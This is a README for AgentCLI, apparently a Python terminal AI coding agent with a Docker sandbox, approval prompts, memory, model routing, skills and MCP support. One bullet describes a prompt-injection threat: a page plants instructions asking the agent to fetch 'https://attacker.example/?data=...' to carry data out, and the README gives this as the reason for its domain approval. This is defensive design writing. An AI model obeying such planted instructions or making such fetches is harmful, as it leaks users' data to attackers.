# AgentCLI

A terminal AI coding agent, built from scratch in Python. It reads and edits code, runs commands with your approval, browses the web, uses MCP servers and skills, and splits large tasks across several agents, each on the model that suits it.

```text
██████       ██
██   ██      ██
██████       ██
██  ██   ██  ██
██   ██   ████  's AgentCLI  v1.2.0
```

## Highlights

**Agent loop and safety**
- ReAct engine on `asyncio`: streamed tool calls are assembled as they arrive; consecutive read-only calls run concurrently, and any write is a barrier that runs alone and in order.
- Shell commands run in a Docker sandbox: the container sees only the project, has no network or host environment (no API keys), no privileges, and capped memory, CPU, and processes. Commands inside it need no approval; one that asks for the network or for the host does.
- File writes go through human approval (HITL) and path isolation; commands also through dangerous-command blocking; everything through a JSONL audit log.
- Edits need a unique match and refuse files that were never read or changed since they were read.
- A workspace snapshot is taken just before a request's first approved write, so a whole turn can be rolled back; read-only requests cost nothing.
- `web_fetch` allows only public addresses and re-checks every redirect hop (SSRF protection). Because a fetch can also carry data out in its URL (a page with planted instructions asking for `https://attacker.example/?data=...`), the first fetch from a site not yet approved asks; you can allow it once or for the project from then on (`d`), a few documentation sites are allowed from the start (`web.allowed_domains` adds more), and a redirect to an unapproved site is not followed.

**Context and prompt caching**
- The system prompt is static for the session. Per-request context (date, recalled memories, skill candidates) rides on the user message, so the provider's prefix cache covers the system prompt, the tools, and every earlier turn.
- Layered compression near the token budget: clear old tool results, then a rolling summary by a light model (extractive fallback), then truncation. It triggers at 80% and compresses to 55%, so it does not fire on every turn.
- Long-term memory in SQLite, recalled per question. `/compact [focus]` on demand, and a reminder when the prompt cache has probably expired.

**Tools, MCP, and skills**
- MCP both ways: as a client (stdio and Streamable HTTP, persistent sessions, cached tool lists) and as a server on the official SDK, with DNS-rebinding protection.
- MCP tools are deferred: requests carry only their names until the model loads what a task needs, so adding servers does not grow every request.
- Two Chrome DevTools MCP browsers: a headless one for JavaScript pages, and a visible one for logins and bot checks, which the user completes.
- Skills (`SKILL.md` + scripts + references) with three-level progressive disclosure: name and description always, the manual when needed, and files on request.

**Multi-agent and model routing**
- `/plan`: the planner builds a DAG, checks it for cycles, and runs steps in dependency order, in parallel where it can.
- `/team`: parallel workers, each reviewed by a model one tier above the worker. A rejection comes back with the issues; repeated rejections move the step up a tier, and a bounded number of escalations ends with the issues handed to the user instead of a retry loop.
- Intent routing before each request: rules first, a cheap classifier only when unsure, the rules as the fallback. Large tasks get a suggestion to switch to `/plan` or `/team`.
- Any OpenAI-compatible provider. A checked OpenRouter catalog with prices, so every answer ends with a line such as:

  ```text
  ✓ openai/gpt-6-luna · 4 model calls · 5 tool calls (web_search×2, web_fetch, load_skill×2) · skills finance-qa, web-access · 52.3k in (40.1k cached) / 2.4k out · $0.014 · 38s
  ```

## Architecture

```mermaid
flowchart TD
    subgraph Entry["Entry points"]
        REPL["REPL / -p"]
        API["Runtime API · SDK"]
        MCPS["MCP server<br/>(other agents use our tools)"]
    end

    REPL --> Router["Intent router<br/>rules → classifier → rules"]
    Router -->|normal| Loop
    Router -->|/plan| Plan["Plan-and-Execute<br/>DAG + cycle check"]
    Router -->|/team| Team["Orchestrator<br/>Planner · Workers · Reviewer"]
    Plan --> Loop
    Team --> Loop
    API --> Loop

    Loop["ReAct loop<br/>stream · tool calls · results"]
    Loop <--> LLM["LLM client<br/>OpenRouter · DeepSeek · OpenAI-compatible<br/>model tiers · usage & cost"]
    Loop <--> Ctx["Context<br/>static prompt + AGENTCLI.md<br/>memory recall · layered compression"]
    Loop --> Exec["Tool executor<br/>read-only batches · write barriers"]

    Exec --> Guard["Policy<br/>HITL · path & command guards<br/>audit log · lazy snapshot"]
    Guard --> Builtins["17 built-in tools<br/>files · bash · search · web · memory"]
    Guard --> MCPC["MCP client<br/>deferred tools via load_tools"]
    Guard --> Skills["Skills<br/>progressive disclosure"]
    MCPC --> Chrome["Chrome DevTools MCP<br/>headless · visible"]
    MCPS --> Guard
```

One request in normal mode:

1. The router estimates the task size and may suggest `/plan` or `/team`.
2. The loop sends the static system prompt, tool definitions, history, and the new message with its per-request context. Compression runs first if the budget is nearly full.
3. The model streams text, reasoning, and tool calls. Calls are grouped: read-only ones run together; a write waits for approval, takes the snapshot if it is the turn's first write, and runs alone.
4. Results go back to the model, and the loop repeats until the model answers without tools, then prints the summary line.

## Quick Start

Requirements: Python 3.11+, [uv](https://docs.astral.sh/uv/). Optional: `rg` for faster search; Node.js and Chrome for the browser tools.

```bash
uv sync --extra dev
```

Set a key (either one), then start the REPL:

```bash
export OPENROUTER_API_KEY=...        # many models through one key
export DEEPSEEK_API_KEY=...          # DeepSeek's own API
uv run agentcli
```

Inside the REPL, just type what you want; use `@path/to/file` to point at a file. `/help` lists every command, and `Shift+Tab` switches the approval mode.

Other ways to run it:

```bash
uv run agentcli -p "Summarize this repository"                                   # one prompt
uv run agentcli --mode plan -p "Read the README and verify the project structure" --json
uv run agentcli --mode team --worker-mode plan -p "Review the core modules in parallel" --json
uv run agentcli doctor --cwd .                                                    # check the setup
uv run agentcli mcp init-chrome --scope user                                      # add the browsers
```

## Configuration

Configuration is loaded in this order, later sources overriding earlier ones:

1. Built-in defaults
2. `~/.agentcli/config.json`
3. Project-level `.agentcli/config.json`
4. Project-level `.env`
5. CLI flags
6. Process environment variables

Use `.env.example` or `.agentcli/config.example.json` as a starting point.

`~/.agentcli` is the default data folder: the user config, `mcp.json`, long-term memory (`memory.db`), the audit log, user skills, snapshots, prompt history, and the visible browser's profile. Set `AGENTCLI_HOME` to keep all of it somewhere else, for example on another drive (`setx AGENTCLI_HOME D:\agentcli-data` on Windows). Every `~/.agentcli` path below then means that folder.

Example `.env`:

```dotenv
AGENTCLI_PROVIDER=openrouter
AGENTCLI_MODEL=openai/gpt-6-luna
OPENROUTER_API_KEY=your_key_here
```

`AGENTCLI_API_KEY` works for any provider. Provider-specific keys: `OPENROUTER_API_KEY`, `DEEPSEEK_API_KEY`, `ZAI_API_KEY` / `GLM_API_KEY`, `KIMI_API_KEY`, `STEP_API_KEY`.

With one `OPENROUTER_API_KEY`, `/model` offers a checked set of models: GPT-6 Astra, Sol and Luna, Claude Opus 5.5, DeepSeek V4 Flash / V4.1 Flash / V4 Pro 0813, GLM-5.3 and GLM-5.3 Flash, Qwen3.8 Flash, and Gemini 3.8 Flash. Each passed a tool-calling run through AgentCLI before being listed and carries OpenRouter's published prices (dated in `llm/pricing.py`). Any other OpenRouter model id works too, without built-in prices.

Local OpenAI-compatible services work as well:

```bash
AGENTCLI_PROVIDER=openai-compatible \
AGENTCLI_BASE_URL=http://127.0.0.1:11434/v1 \
AGENTCLI_MODEL=qwen2.5-coder \
uv run agentcli -p "Explain this repository"
```

## REPL Commands

| Command | What it does |
| --- | --- |
| `/help`, `/exit`, `/clear` | Help, quit, start a new conversation |
| `/model [provider] [model-id]` | Pick or switch the model |
| `/plan <task>` | Plan as a DAG, then run the steps in dependency order |
| `/team [--plan] <task>` | Planner, parallel workers, and a reviewer |
| `/compact [focus]` | Summarize the conversation now, keeping the focus in detail |
| `/context`, `/usage` | Context size and breakdown; tokens and cost |
| `/memory [search\|stats\|delete\|clear]`, `/save <fact>` | Long-term memory |
| `/skill [list\|show\|on\|off\|reload] [name]` | Skills |
| `/tools`, `/mcp` | Tools and MCP servers |
| `/hitl default\|auto`, `/policy`, `/audit [N]` | Approval mode, policy, audit log |
| `/sandbox` | Where commands run: the Docker sandbox or the host |
| `/snapshot [clean]`, `/restore <id-or-index>` | Snapshots and rollback |
| `/task [add\|cancel\|log]` | Background tasks |
| `/index [path]`, `/search <query>` | Code index and search |
| `/config` | Effective configuration |

## Built-In Tools

`read_file`, `write_file`, `edit_file`, `list_dir`, `directory_tree`, `get_file_info`, `glob`, `grep`, `search_code`, `bash`, `web_search`, `web_fetch`, `save_memory`, `search_memory`, `load_skill`, `save_skill`, `revert_turn`. When MCP servers are configured, `load_tools` is added to load their tools on demand.

File writes, commands, MCP tools that change things, snapshot restore, and skill saving go through the policy, approval, and audit layer. With the default `auto` policy they need approval, except shell commands that run in the sandbox. In single-prompt mode there is no one to approve, so pass `--hitl never` only for a project you are willing to let the agent change.

### Sandbox

With Docker available, `bash` runs in a container instead of on your machine (`sandbox.mode`, default `docker`). The image, `agentcli-sandbox:1` (Python 3.12, uv, git, ripgrep), is built from `src/agentcli/sandbox/Dockerfile` the first time. One container per project per session, removed on exit (and by its own 12-hour timer if AgentCLI is killed):

- only the project folder is mounted, at `/workspace`; the rest of the machine is invisible, so path isolation holds for commands too;
- no network, and none of your environment variables, so no API keys;
- no Linux capabilities, no privilege escalation, a read-only system with a writable `/tmp`, and limits of 2 GB, 2 CPUs, and 256 processes;
- the project's dependencies go to a Docker volume at `/opt/venv`, leaving the project's own `.venv` alone.

Commands in the sandbox need no approval: the worst they can do is change project files, which the turn snapshot can restore. A command that needs the internet sets `network: true` and runs in a one-off networked container after you approve; one that needs your machine's own tools sets `sandbox: false` and runs on the host after you approve. Without Docker, or with `sandbox.mode` `off` (or `AGENTCLI_SANDBOX=off`), commands run on the host and each needs approval, as before. The command blocklist still applies everywhere.

An MCP tool's own `readOnlyHint` lets it skip approval only when its server entry sets `"trusted": true`, because a server describes itself and an untrusted one could claim to be read-only.

## Memory And Context

AgentCLI uses three memory layers:

- Short-term: the current session's messages and tool results, compacted as described below and saved as a session you can resume.
- Static long-term: project instruction files in the system prompt. `AGENTS.md`, `AGENTCLI.md`, and `AGENTCLI.local.md` in the project root or `.agentcli/`, plus any paths in `prompt.custom_prompt_paths`. Put project rules, test and run commands, and conventions there.
- Dynamic long-term: one Markdown file per memory under `<AGENTCLI_HOME>/memory/<project>/`, with a generated `MEMORY.md` index (see below).

### Sessions

Every conversation is saved under `<AGENTCLI_HOME>/sessions/<id>/`: the messages the model sees (after compaction), a readable transcript, and its title, project, model, and times. Nothing is written before the first message.

```bash
agentcli -c            # continue this project's latest session
agentcli -r            # pick one to resume
agentcli --session ID  # resume one by id
```

In the REPL, `/new` (or `/clear`) starts a new session and keeps the old one, `/resume` opens the picker, `/sessions` lists or deletes, and `/rename` names the current one. Sessions unused for 30 days are deleted (`memory.session_retention_days`); saved tool results after 7.

### Long-term memory

The agent saves a memory with `save_memory` (or you with `/save`) when something should outlast the session: a constraint, a correction, a preference, a decision. Each is a file with its title, kind, importance, and 5-10 keywords the model writes at the same time (synonyms, abbreviations, Chinese and English names), so later questions in other words still find it. Saving the same title again updates the memory. Files can be read and edited in any editor; the index is rebuilt from them.

Memories are recalled in three tiers:

1. The index (one line per memory) is in the system prompt from the start of a session, so the model knows what exists. It is fixed for the session and stays in the prompt cache.
2. With each request, the full text of the few memories it is about. BM25 over title, keywords, and content shortlists 15; with `TYPESAFE_API_KEY` set, one request to [Jev](https://docs.typesafe.ai) (a decision model: typed yes/no answers with probabilities, about 0.25 s) says for each whether it helps answer the request, and up to 3 with a probability of 0.85 or more are attached. Without Jev, or when it is slow (0.8 s) or down, the gate is word coverage: top 3 covering at least 55% of the request's subject words. Precision first either way: a wrong memory costs tokens and can mislead, a missing one can be looked up. On the recall set Jev raised the share of relevant memories attached from 56% to 97% at 98% precision, with none attached to unrelated requests (`evals/README.md`, experiment 5).
3. `search_memory` for more, with a lower bar (35%) and up to 8 results; the model can also `read_file` a memory file.

The ranking weights and both bars were set on a labelled recall set (`evals/README.md`, experiment 4): relevance decides the order, and importance and recency only break near-ties. `/memory` shows the index; `/memory search|show|delete|stats|path|clear` manage it. Memories from the earlier SQLite store are imported into files once per project.

The system prompt is fully static for a session. Per-request context (date, working directory, recalled memories, skill candidates) is attached to the user message that triggered it and then stays frozen in history, so the prefix cache covers the system prompt, tool definitions, and all earlier turns.

Compaction works inside a workspace W = min(80% of what the model's window leaves for input, `memory.workspace_tokens`), 200k by default: a 1M-token model still compacts around 200k, because past that every call re-reads far more than it uses, costs more even at cached prices, answers later, and attends worse. With W = 200k:

| Layer | When | What |
| --- | --- | --- |
| Protected | always | The newest 20% of W (40k tokens), and at least the latest message, is never touched. |
| 1. Clear | at 50% of W, if clearing brings it to 40% or less | Tool results older than the protected part become one-line stubs. No model call. The full text is saved under `<AGENTCLI_HOME>/sessions/` for 7 days, and the stub says where (or, for file reads and searches, to run them again). |
| 2. Summarize | at 80% of W | Everything older than the protected part, with the previous summary, is folded into one rolling summary by `memory.summary_model` (GPT-6 Luna via OpenRouter by default; the session model when that key is missing). An extractive summary is the fallback. |
| 3. Backstop | as needed | A new tool result over half the protected size is cut to its head and tail before the model sees it (full copy saved); the summary is shortened if still over; a provider "context too long" error triggers a forced compaction and one retry. |

Each rewrite of the history makes the provider re-read everything after the first changed message at full price, so both layers wait until they free a lot at once, and each leaves the next one far away. The thresholds are `memory.workspace_tokens`, `protect_ratio`, `clear_ratio`, `clear_min_ratio`, and `compression_threshold`. `evals/README.md` has the measurements behind them.

`/compact [focus]` summarizes on demand, whatever the size, keeping the last few messages and the focus in most detail. The summary is session state and is never written to long-term memory.

Providers keep the prompt cache only for a while and do not report when it expires. When you come back after `memory.cache_ttl_minutes` (default 60) with a context of at least `memory.idle_reminder_min_tokens` (default 30,000), the REPL says so before sending, with the extra cost when the model has prices. You can send anyway, compact first, or cancel. After `memory.stale_session_hours` (default 8) it suggests compacting first.

## Routing

Before a request runs in normal mode, AgentCLI estimates how big it is. Built-in rules settle a plain short question at once and flag a clearly large request (length, step words such as "首先/然后/最后", listed items, scope words such as "整个/重构/迁移", fan-out words such as "分别/并行"). Everything else goes to a cheap model (`classifier_model`), tried in the order of `routing.classifiers`. It has a timeout, and a classifier that is slow or down is skipped, so the rules' verdict is always the fallback. Jev can be added to the chain (`"jev"` plus `jev_enabled`), but on a labelled set it chose react, /plan, or /team correctly 87% of the time against the model's 97%, so it is off by default (experiment 6).

With `routing.preload_tools` (off by default) and `TYPESAFE_API_KEY`, Jev also guesses from the request whether it needs a deferred MCP server, such as the browser, and which of its tools, and loads them before the first model call so the model can skip `load_tools`. It cut browser tasks' model calls by 18% but not their cost (experiment 8).

`/plan` and `/team` can use a different model per role, as `"provider:model"`:

```json
{
  "routing": {
    "planner_model": "openrouter:anthropic/claude-opus-5.5",
    "fast_model": "openrouter:openai/gpt-6-luna",
    "strong_model": "openrouter:openai/gpt-6-sol",
    "top_model": "openrouter:anthropic/claude-opus-5.5"
  }
}
```

The planner writes each step as self-contained instructions and marks it easy or hard. Easy steps run on the fast model, hard ones on the strong model. In `/team` the reviewer is always one tier above the worker, so no model grades its own work. After `attempts_per_tier` rejections (default 2) a step moves up one tier, at most `max_escalations` times (default 1); if it is still rejected it fails with the reviewer's issues in the final report. Unset roles use the session model, and so does a role whose provider key is missing.

## Skills

A skill is a folder with a `SKILL.md` manual (YAML frontmatter with `name` and `description`, then instructions) and, optionally, scripts and reference files the manual points to. The format matches the SKILL.md skills published for other agents, so most of them install unchanged.

Skills are found in three places, later ones overriding earlier ones: built-in, `~/.agentcli/skills/<name>/` (every project), and `<project>/.agentcli/skills/<name>/` (one project). Every enabled skill's name and description is listed in the `load_skill` tool; the full manual is only read when a task needs it, and loading it also tells the model the skill's folder and files.

```bash
uv run agentcli skill add examples/skills/finance-qa          # install for all projects
uv run agentcli skill add path/to/skill --scope project       # this project only
uv run agentcli skill list
```

Built in: `web-access` (how to research the web: search, fetch, then the browsers). In `examples/skills/`:

- `pdf-tools`: text, tables, search, merge, and split for PDF files (`pip install pypdf pdfplumber`)
- `office-docs`: read and create Word, Excel, and PowerPoint files (`pip install python-docx openpyxl python-pptx`)
- `finance-qa`: company and stock questions, with a calculator script so figures are computed, not guessed
- `trump-style`, `sun-yuchen-style`: parody voices for code reviews and release notes

## MCP

Add browsers for the agent (pages that need JavaScript, or a login):

```bash
uv run agentcli mcp init-chrome --scope user
```

This writes two `chrome-devtools-mcp` servers, both with a pinned version and usage reporting off:

- `chrome-devtools`: headless, with a throwaway `--isolated` profile, for public pages that only need JavaScript to render.
- `chrome-visible`: a window you can see, with a saved AgentCLI-only profile in `~/.agentcli/browser-profile`, separate from your own Chrome. For sites behind a login or a bot check, you sign in or complete the check yourself, and the login is kept for next time. Delete the folder to forget every login. `--no-visible` skips it.

Both are marked `"trusted": true`, so the server's own read-only tools skip approval while navigation, snapshots, clicks, and scripts still ask.

MCP servers cost nothing until they are used:

- Startup reads each server's tool list from a cache in `~/.agentcli/mcp-cache` instead of launching it. The cache is keyed on the server's command, arguments, and environment, so editing the config refreshes it; `agentcli mcp refresh` clears it.
- MCP tools are deferred: requests carry only their names (in `load_tools`), and the model loads the tools a task needs. Set `"defer": false` on a server to always send its tools.
- A server starts on the first call to one of its tools, keeps one connection for the rest of the session (a page opened by `navigate_page` is still there for `take_snapshot`), and is stopped with the browsers it launched when the session ends.
- AgentCLI tells each server the project folder as its MCP root, so servers that write files (a browser saving a snapshot or a screenshot) can write there and nowhere else.

Expose AgentCLI's tools as an MCP server, so another agent or IDE can use them:

```bash
uv run agentcli mcp serve --transport stdio --cwd /path/to/project
uv run agentcli mcp serve --transport http --port 3000      # http://127.0.0.1:3000/mcp
uv run agentcli mcp serve --read-only                       # only tools that change nothing
```

The server is built on the official MCP SDK. Each tool is annotated as read-only or destructive so the client can ask for approval accordingly, and AgentCLI's path and command guards still apply. HTTP listens on 127.0.0.1 only and rejects requests whose Host or Origin is not local, so a web page open in your browser cannot drive it. For example, to let Claude Code use AgentCLI's tools:

```bash
claude mcp add agentcli -- uv run --project /path/to/AgentCLI agentcli mcp serve --cwd /path/to/project
```

## Runtime API And SDK

Start the HTTP runtime, then create threads, send turns, or queue background tasks:

```bash
AGENTCLI_RUNTIME_API_KEY=dev-key uv run agentcli serve --http --port 8080

curl -sS -X POST http://127.0.0.1:8080/v1/threads -H 'x-api-key: dev-key'
curl -sS -X POST http://127.0.0.1:8080/v1/threads/<thread_id>/turns \
  -H 'content-type: application/json' -H 'x-api-key: dev-key' \
  -d '{"message":"Summarize this project"}'
curl -sS -X POST http://127.0.0.1:8080/v1/tasks \
  -H 'content-type: application/json' -H 'x-api-key: dev-key' \
  -d '{"message":"Analyze this repository in the background","mode":"plan"}'

uv run agentcli worker --workers 2 --cwd .      # run tasks without exposing HTTP
```

From Python:

```python
from agentcli.sdk import create_default_engine

engine = create_default_engine(cwd=".")
print(engine.ask_complete("Explain this project").text)
plan_result = engine.plan_complete("Read README first, then summarize the architecture")
team_result = engine.team_complete("Ask multiple agents to inspect core modules")
```

## Development

```bash
uv sync --extra dev
uv run python -m ruff check .
uv run python -m ruff format --check .
uv run python -m pytest
uv build
```

Source layout (`src/agentcli/`): `agent/` (ReAct loop, plan-and-execute, orchestrator), `routing/` (intent and model tiers), `llm/` (clients, catalog, prices), `context/` and `prompt/` (compression, prompt assembly), `memory/`, `tools/`, `policy/` (guards, approval, audit), `snapshot/`, `mcp/` (client, server, config), `skill/`, `web/`, `runtime/`, `entrypoints/` (CLI and REPL), `render/`.

## License

MIT. See [LICENSE](LICENSE).
